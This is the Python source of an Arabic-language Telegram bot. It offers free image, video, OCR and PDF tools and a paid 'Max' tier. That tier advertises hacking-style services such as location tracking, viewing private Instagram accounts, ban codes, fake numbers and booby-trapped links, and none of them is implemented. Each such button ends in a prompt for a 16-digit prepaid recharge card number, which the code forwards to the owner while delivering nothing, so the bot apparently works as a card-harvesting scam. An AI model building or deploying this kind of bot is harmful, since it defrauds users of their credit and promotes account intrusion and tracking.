import glob
import os
import time
import shutil
import telebot
import urllib.parse
from telebot import apihelper
from telebot import types
from flask import Flask, request
from apscheduler.schedulers.background import BackgroundScheduler
import services


# --- 1. الإعدادات والتهيئة ---
apihelper.ENABLE_MIDDLEWARE = True
OWNER_ID = int(os.getenv('OWNER_ID', 0)) 
TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)
user_last_message_time = {}

# --- 2. نظام التريث التلقائي (Middleware) ---
@bot.middleware_handler(update_types=['message', 'callback_query'])
def rate_limit_middleware(update_type, data):
    user_id = data.from_user.id
    if user_id == OWNER_ID: 
        return
    
    current_time = time.time()
    last_time = user_last_message_time.get(user_id, 0)
    
    if current_time - last_time < 1:  # تريث ثانية واحدة لمنع السخام (Spam)
        if update_type == 'message':
            bot.reply_to(data, "⏳ تريث قليلاً قبل إرسال الطلب التالي!")
        else:
            bot.answer_callback_query(data.id, "⏳ تريث قليلاً!")
        return {"ok": False}
    
    user_last_message_time[user_id] = current_time

# --- 3. التنظيف التلقائي للمخلفات السيرفر ---
def auto_cleanup_job():
    patterns = ["video_*.mp4", "img_*.jpg", "output_*.pdf", "*.tmp"]
    count = 0
    for pattern in patterns:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
                count += 1
            except Exception:
                pass
    if count > 0: 
        print(f"🧹 [تنظيف تلقائي]: تم مسح {count} من الملفات المؤقتة بنجاح.")

scheduler = BackgroundScheduler()
scheduler.add_job(auto_cleanup_job, 'interval', minutes=2)
scheduler.start()

# --- 4. معالجة الأوامر النصية الأساسية ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("الاشتراك المجاني 🔓", callback_data='free_sub'),
        types.InlineKeyboardButton("اشتراك ماكس ✨ 👑", callback_data='max_sub')
    )
    bot.send_message(message.chat.id, "أهلاً بك في ✨ <b>𝓜𝓐𝓧 𝓑𝓞𝓞𝓣</b> ✨\n\nالرجاء اختيار نوع الاشتراك لبدء العمل:", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(commands=['storage'])
def check_storage(message):
    if message.from_user.id != OWNER_ID: 
        return
    total, used, free = shutil.disk_usage("/")
    response = (f"📊 <b>حالة ذاكرة تخزين السيرفر:</b>\n"
                f"💾 الإجمالي: {total // (1024*1024)} MB\n"
                f"📉 المستهلك: {used // (1024*1024)} MB\n"
                f"✅ المتبقي المتاح: {free // (1024*1024)} MB")
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def restrict_commands(message):
    if message.from_user.id == OWNER_ID or message.text == '/start': 
        return
    bot.reply_to(message, "⚠️ نعتذر، الخدمة أو الأمر غير مصرح به.")

# --- 5. معالجة تفاعلات الأزرار والخدمات ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try: 
        bot.answer_callback_query(call.id)
    except Exception: 
        pass

    # الخطة المجانية
    if call.data == 'free_sub':
        my_free_names = [
    "زيادة دقة الصور 🌅",
    "تحميل أي فيديو 📥",
    "ترجمة صورة الى نص 📝",
    "تحويل صورة لـ PDF 📄",
]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
        markup.add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id,"🌅 أرسل الصورة التي تريد تحسين جودتها الآن:")
        bot.register_next_step_handler(msg, process_enhance_image)
    elif call.data == 'f2':
        msg = bot.send_message(call.message.chat.id, "📥 أرسل لي رابط الفيديو المراد تحميله الآن:")
        bot.register_next_step_handler(msg, process_video_link)
    elif call.data == 'f3':
        msg = bot.send_message(call.message.chat.id, "📝 أرسل الصورة التي تحتوي على النصوص المراد استخراجها وترجمتها:")
        bot.register_next_step_handler(msg, process_ocr)
    elif call.data == 'f4':
        msg = bot.send_message(call.message.chat.id, "📄 أرسل الصورة التي تريد تحويلها إلى ملف PDF:")
        bot.register_next_step_handler(msg, process_image_to_pdf)

 

    # اشتراك ماكس (العروض المميزة المدفوعة)
    elif call.data == 'max_sub':
        my_names = ["💀 واتساب بلس", "👑 يوزرات مميزة", "⚡️ كود حظر", "📷 حماية كاميرا", "📍 تحديد موقع", "☠️ دعم تيكتوك", "✅ أرقام فيك", "👀 انستا برايفت", "➕ فك سافيوم", "🛠 أدوات متطورة", "✨ مزايا انستا", "🌎 تلغيم روابط", "🎮 شحن ألعاب", "✅ رشق انستا", "🚀 تطبيقات برو", "📱 بلياردو لانهائي", "🤖 تيكتوك ترول", "📢 إزالة الإعلانات", "✅ أرقام حقيقية", "🍏 برامج آيفون"]
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
        markup.add(*buttons)
        bot.edit_message_text("اختر خدمة ماكس المتقدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل خطة ماكس الآن ✨", callback_data='activate_max'))
        bot.edit_message_text("🔒 <b>عذراً، هذه الخدمة تتطلب اشتراك ماكس ✨</b>\n\nيرجى ترقية حسابك لتتمكن من استخدامها فوراً.", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
        
    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("الرجاء اختيار مزود الخدمة الخاص بك:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"لقد اخترت شبكة ({provider}).\n\nتكلفة الاشتراك الشهري كارت فئة 5$.\nالرجاء إرسال رقم كارت الشحن المكون من (16 رقماً) الآن:")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# --- 6. دوال التنفيذ والوظائف 
def process_enhance_image(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id

        input_file = f"img_{chat_id}.jpg"
        output_file = f"enhanced_{chat_id}.jpg"

        wait_msg = bot.send_message(
            chat_id,
            "⏳ جاري تحسين جودة الصورة..."
        )

        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(input_file, 'wb') as f:
                f.write(downloaded_file)

            services.enhance_image(input_file, output_file)

            with open(output_file, 'rb') as photo:
                bot.send_photo(
                    chat_id,
                    photo,
                    caption="✅ تم تحسين جودة الصورة بنجاح."
                )

        except Exception as e:
            bot.send_message(
                chat_id,
                f"❌ حدث خطأ أثناء معالجة الصورة:\n{str(e)}"
            )

        finally:
            try:
                bot.delete_message(chat_id, wait_msg.message_id)
            except:
                pass

            if os.path.exists(input_file):
                os.remove(input_file)

            if os.path.exists(output_file):
                os.remove(output_file)

    else:
        bot.reply_to(
            message,
            "❌ يرجى إرسال صورة فقط."
        )


def process_video_link(message):
    url, chat_id = message.text.strip(), message.chat.id
    file_name = f"video_{chat_id}.mp4"
    wait_msg = bot.send_message(chat_id, "⏳ جاري تحميل وتجهيز الفيديو، يرجى الانتظار...")
    try:
        services.download_video_service(url, file_name) 
        with open(file_name, 'rb') as video: 
            bot.send_video(chat_id, video)
    except Exception as e: 
        bot.send_message(chat_id, f"⚠️ عذراً، تعذر تحميل الفيديو: {str(e)}")
    finally:
        try: bot.delete_message(chat_id, wait_msg.message_id)
        except Exception: pass
        if os.path.exists(file_name): 
            os.remove(file_name)

def process_ocr(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id
        file_name = f"img_{chat_id}.jpg"
        wait_msg = bot.send_message(chat_id, "⏳ جاري قراءة الصورة واستخراج النصوص...")
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as f: 
                f.write(downloaded_file)
            
            text = services.extract_text_from_image(file_name)
            if text:
                translated = services.translate_text(text)
                bot.send_message(chat_id, f"📜 <b>النص المستخرج:</b>\n<code>{text}</code>\n\n🌍 <b>الترجمة الحرفية للعربية:</b>\n{translated}", parse_mode="HTML")
            else:
                bot.send_message(chat_id, "⚠️ تعذر العثور على نصوص واضحة داخل هذه الصورة.")
        except Exception as e:
            bot.send_message(chat_id, f"❌ حدث خطأ غير متوقع: {str(e)}")
        finally:
            try: bot.delete_message(chat_id, wait_msg.message_id)
            except Exception: pass
            if os.path.exists(file_name): 
                os.remove(file_name)
    else:
        bot.reply_to(message, "❌ خطأ: يرجى إرسال ملف بصيغة صورة حصراً.")

def process_image_to_pdf(message):
    if message.content_type == 'photo':
        chat_id = message.chat.id
        img_name = f"img_{chat_id}.jpg"
        pdf_name = f"output_{chat_id}.pdf"
        wait_msg = bot.send_message(chat_id, "⏳ جاري تحويل الصورة إلى ملف PDF...")
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(img_name, 'wb') as f:
                f.write(downloaded_file)
            
            services.convert_to_pdf(img_name, pdf_name)
            with open(pdf_name, 'rb') as pdf:
                bot.send_document(chat_id, pdf)
        except Exception as e:
            bot.send_message(chat_id, f"❌ تعذر إنتاج ملف الـ PDF: {str(e)}")
        finally:
            try: bot.delete_message(chat_id, wait_msg.message_id)
            except Exception: pass
            if os.path.exists(img_name): os.remove(img_name)
            if os.path.exists(pdf_name): os.remove(pdf_name)
    else:
        bot.reply_to(message, "❌ خطأ: يرجى إرسال صورة فقط ليتم تحويلها.")

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "⏳ جاري مراجعة وتأكيد صلاحية الكارت، يرجى الانتظار...")
        try: 
            bot.send_message(OWNER_ID, f"🔔 <b>طلب اشتراك ماكس جديد:</b>\n📱 المزود: {provider}\n💳 رقم الكارت: <code>{message.text}</code>", parse_mode="HTML")
        except Exception: 
            pass
    else:
        msg = bot.reply_to(message, "❌ خطأ: رقم الكارت غير صالح. يرجى إرسال الرقم المكون من 16 رقماً فقط بدون فواصل:")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# --- 7. تشغيل سيرفر الويب والـ Webhook ---
app = Flask(__name__)

@app.route('/')
def home(): 
    return "البوت يعمل بنظام Webhook ومحمي بالكامل!"

@app.route('/ping')
def ping(): 
    return "I am alive!", 200

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '!', 200
    return 'Forbidden', 403

if __name__ == "__main__":
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    PORT = int(os.environ.get("PORT", 8080))
    if WEBHOOK_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
        print(f"🚀 البوت تم تشغيله بنجاح عبر الـ Webhook على المنفذ: {PORT}")
        app.run(host='0.0.0.0', port=PORT)
    else:
        print("⚠️ خطأ في التشغيل: لم يتم العثور على متغير البيئة WEBHOOK_URL.")
